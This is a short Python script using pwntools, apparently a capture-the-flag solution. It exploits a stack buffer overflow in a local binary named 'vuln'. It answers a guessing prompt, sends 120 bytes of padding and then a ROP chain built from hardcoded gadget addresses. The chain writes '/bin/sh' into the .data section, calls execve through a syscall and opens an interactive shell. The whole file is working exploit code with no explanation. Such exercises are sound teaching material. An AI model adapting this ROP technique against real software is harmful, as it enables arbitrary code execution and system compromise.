#!/usr/bin/python3
from pwn import process, p64

shell = process("./vuln")

offset = 120
junk = b"A" * offset

payload  = b""
payload += junk
payload += p64(0x400696)  # pop rdi; ret;
payload += p64(0x6ba0e0)  # .data
payload += p64(0x410ca3)  # pop rsi; ret;
payload += b"/bin/sh\x00" # pathname
payload += p64(0x447d7b)  # mov qword ptr [rdi], rsi; ret;
payload += p64(0x400696)  # pop rdi; ret;
payload += p64(0x6ba0e0)  # .data
payload += p64(0x410ca3)  # pop rsi; ret;
payload += p64(0x0)       # argv = NULL
payload += p64(0x44cc26)  # pop rdx; ret;
payload += p64(0x0)       # envp = NULL
payload += p64(0x4163f4)  # pop rax; ret;
payload += p64(0x3b)      # execve()
payload += p64(0x40137c)  # syscall; ret;

shell.sendlineafter(b" guess?", b"84")
shell.sendlineafter(b"Name? ", payload)

shell.recv()
shell.interactive()
